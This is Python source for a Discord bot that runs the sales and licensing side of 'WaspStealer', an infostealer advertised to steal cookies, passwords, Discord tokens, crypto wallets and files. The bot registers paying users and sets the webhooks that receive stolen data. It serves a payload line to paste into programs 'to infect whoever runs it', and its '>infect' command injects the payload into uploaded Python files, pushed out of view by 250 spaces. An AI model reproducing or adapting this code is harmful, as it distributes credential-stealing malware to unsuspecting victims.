import discord
from discord.ext import commands
from requests import get, post

from io import StringIO, BytesIO
from threading import Thread
import asyncio

bot = commands.Bot(command_prefix = '>')

token = "xxxx"

# W4SP BOT
# by billythegoat356

admin = [101]
admin_key = 'xxxxx'
api = 'http://x:80'


wasp = """x"""


help = """x"""


doc = """x"""


features = """**Wasp Stealer | Features**
> FUD (Fully Undetectable)
> Cookie Stealer
> Password Stealer
> Discord Stealer
> Wallet Stealer (Exodus, ect)
> History Stealer
> File Stealer (Interesting Files)
> Fast And Reliable
> Hosted 24/7
> Webhook Protection
"""

def get_keys():
    return post(f'{api}/keys', headers={'key': admin_key})

def get_user(json, info):
    for a in json:
        c = json[a]
        if str(info) == str(a):
            return a
        for b in c:
            if info in b.lower():
                return a
    return None


# async def update_features():
#     guild = bot.get_guild(1018612705663389696)
#     channel_features = discord.utils.get(guild.channels, id=x)
#     # channel_flex = discord.utils.get(guild.channels, id=x)
#     channel_changelogs = discord.utils.get(guild.channels, id=x)

#     interval = 1800
#     while True:
#         msg = await channel_features.send(features)

#         # mess = await channel_flex.history(limit=None).flatten()
#         # mess = reversed(list(mess))
	
#         mess2 = await channel_changelogs.history(limit=None).flatten()
#         mess2 = reversed(list(mess2))


#         # for nmess in mess:
#         #     content = nmess.content
#         #     files = [discord.File(BytesIO(await attachment.read()), filename=attachment.filename) for attachment in nmess.attachments]
#         #     if content and files:
#         #         await channel_flex.send(content, files=files)
#         #     elif content:
#         #         await channel_flex.send(content)
#         #     elif files:
#         #         await channel_flex.send(files=files)
#         #     await nmess.delete()
	
#         for nmess in mess2:
#             content = nmess.content
#             files = [discord.File(BytesIO(await attachment.read()), filename=attachment.filename) for attachment in nmess.attachments]
#             if content and files:
#                 await channel_changelogs.send(content, files=files)
#             elif content:
#                 await channel_changelogs.send(content)
#             elif files:
#                 await channel_changelogs.send(files=files)
#             await nmess.delete()

#         await asyncio.sleep(interval)
#         await msg.delete()

@bot.event
async def on_ready():
    print("Ready!")
    await bot.change_presence(activity=discord.Game(name="$help"))
    bot.remove_command('help')

    # await update_features()



@bot.command()
async def gen(ctx, user: discord.User, *payment: str):
    if not payment:
        return
    if ctx.message.author.id not in admin:
        return
    id = user.id
    _usr = f'{user.name}#{user.discriminator}'
    usr = "".join(char for char in _usr if char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!?,.")
    payment = " ".join(payment)
    r = post(f'{api}/gen', headers={'key': admin_key, 'id': str(id), 'username': usr, 'payment': payment})

    if r.status_code == 200:
        roles = user.roles
        roles = [role.id for role in roles]
        if 1018614768677949440 not in roles:
            role = discord.utils.get(ctx.guild.roles, id=1018614768677949440)
            await user.add_roles(role)
        await ctx.channel.send(f"Welcome to **WaspStealer** <@{id}>!\n\nYou can list your commands with `>help`!")

    elif r.status_code == 203:
        await ctx.channel.send("Mmh, this user seems to be already registered!")
    else:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")

@bot.command()
async def keys(ctx):
    if ctx.message.author.id not in admin:
        return

    r = get_keys()

    if r.status_code == 401:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
    else:
        await ctx.channel.send(f"There are actually `{len(r.json())}` users registered to WaspStealer!", file=discord.File(StringIO(r.text), filename='keys.json'))

@bot.command()
async def key(ctx, info: str):
    if ctx.message.author.id not in admin:
        return

    r = get_keys()

    info = info.lstrip('<@').rstrip('>')
    if r.status_code == 401:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
    else:
        r = r.json()
        pkey = get_user(r, info)
        if pkey is None:
            return await ctx.channel.send("User not found in database!")
        c = r[pkey]
        return await ctx.channel.send(f"User found!\n\nPrivate key: `{pkey}`\nPublic_key: `{c[0]}`\nWebhook: `{c[1]}`\nRegistration date: `{c[2]}`\nUsername: `{c[3]}`\nID: `{c[4]}`\nPayment: `{c[5]}`")



@bot.command()
async def rm(ctx, info: str):
    if ctx.message.author.id not in admin:
        return

    r = get_keys()

    if r.status_code == 401:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")

    r = r.json()
    pkey = get_user(r, info)
    usr = r[pkey][3]

    if pkey is None:
        return await ctx.channel.send("User not found in database!")

    r = post(f'{api}/rm', headers={'key': admin_key, 'user_key': pkey})

    if r.status_code == 401:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
    elif r.status_code == 200:
        await ctx.channel.send(f"`{usr}`'s license has been removed.")
    else:
        await ctx.channel.send("This user isn't registered to WaspStealer!")




@bot.listen()
async def on_message(message):

    content = message.content
    split_content = content.split()

    # if str(message.channel.category) not in ('Tickets', 'Buy', 'Customers', 'Admin'):
    #     if content == '>help':
    #         await message.reply("Please open a ticket! to use the bot!")
    #     return
    if message.content in ('>wasp', '>w4sp'):
        await message.channel.send(wasp[:995])
        await message.channel.send(wasp[995:])
        return
    # roles = [role.id for role in message.author.roles]

    if content == '>help':
        await message.reply(help)

    elif content == '>doc':
        await message.reply(doc)

        await message.reply("You can now use the Bot!")
    else:
        await message.reply("You have to be a customer to use the Bot!")

    if split_content[0] == '>edit' and len(split_content) == 2:
        webhook = split_content[1]

        r = get_keys().json()
        pkey = get_user(r, str(message.author.id))

        if pkey is None:
            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")

        r = post(f'{api}/edit', headers={'key': pkey, 'webhook': webhook})

        if r.status_code == 401:
            await message.reply("Invalid webhook! Please try again.")
        else:
            await message.reply("Webhook updated successfully!")


    elif content in ('>line', '>script'):
        r = get_keys().json()
        pkey = None
        for a in r:
            for b in r[a]:
                if b == str(message.author.id):
                    pkey = r[a][0]
        if pkey is None:
            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")

        r = get(f'{api}/script/{pkey}').text
        if content == '>line':
            await message.reply(f"Paste this line in your program to infect whoever runs it!\n\n```py\n{r}```")
        elif content == '$script':
            await message.reply("Send this Python file to infect whoever runs it!", file=discord.File(StringIO(r), filename='script.py'))



    elif content == '>infect' and len(message.attachments) == 1:
        r = get_keys().json()
        pkey = None
        for a in r:
            for b in r[a]:
                if b == str(message.author.id):
                    pkey = r[a][0]
        if pkey is None:
            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")
        r = get(f'{api}/script/{pkey}').text
        content = await message.attachments[0].read()
        content = f"from builtins import *\ntype('Hello world!'){' '*250},{r}\n{content.decode('utf-8')}"
        await message.reply("Your file has been infected! Whoever runs it will get infected!", file=discord.File(StringIO(content), filename='infected.py'))


try:
    bot.run(token)
except KeyboardInterrupt:
    print('Goodbye!')
    exit()
